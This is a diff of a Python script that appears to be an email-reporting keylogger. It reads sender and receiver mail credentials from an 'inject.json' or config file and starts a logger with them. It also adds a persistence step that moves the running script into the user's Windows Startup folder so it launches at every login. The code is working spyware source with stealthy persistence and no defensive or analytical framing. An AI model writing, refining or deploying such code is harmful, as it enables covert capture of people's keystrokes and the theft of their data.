@@ -36,16 +36,6 @@ except:
 JsonPath = f"{path}/config.json"
 
 
-#!# -----------------------------------STARTUP----------------------------------- #!#
-
-
-USER_NAME = getpass.getuser()
-Src = (sys.argv[0])
-Dest = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % USER_NAME
-try:
-    shutil.move(Src, Dest)
-except:
-    pass        
 
 #!# -----------------------------------CAPS-LOCK----------------------------------- #!#
 
@@ -191,11 +181,26 @@ def check_config():
          return False
     return True
 
+try:
+    with open(f"inject.json", "r") as Inject:
+        parsed = json.load(Inject)
+except:
+        with open(f"{JsonPath}", "r") as Config:
+                parsed = json.load(Config)
+                JsenderEmail = parsed["sender_email"]
+                JsenderPassword = parsed["sender_password"]
+                JreceiverEmail = parsed["receiver_email"]
+                Jmode = parsed["mode"]
+                       
+                           
+        START_LOGGER(JsenderEmail,JsenderPassword,JreceiverEmail, Jmode)
+
+    
+    
 with open(f"inject.json", "r") as Inject:
         parsed = json.load(Inject)
-        Injector = parsed["Injector"]
-        if Injector == True:
-            with open(f"{JsonPath}", "w") as Config:
+   
+        with open(f"{JsonPath}", "w") as Config:
                     JsenderEmail = parsed["sender_email"]
                     JsenderPassword = parsed["sender_password"]
                     JreceiverEmail = parsed["receiver_email"]
@@ -208,4 +213,14 @@ with open(f"inject.json", "r") as Inject:
 os.remove("inject.json")            
 START_LOGGER(JsenderEmail,JsenderPassword,JreceiverEmail, Jmode)
 
-START_LOGGER()
+
+#!# -----------------------------------STARTUP----------------------------------- #!#
+
+
+USER_NAME = getpass.getuser()
+Src = (sys.argv[0])
+Dest = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % USER_NAME
+try:
+    shutil.move(Src, Dest)
+except:
+    pass        
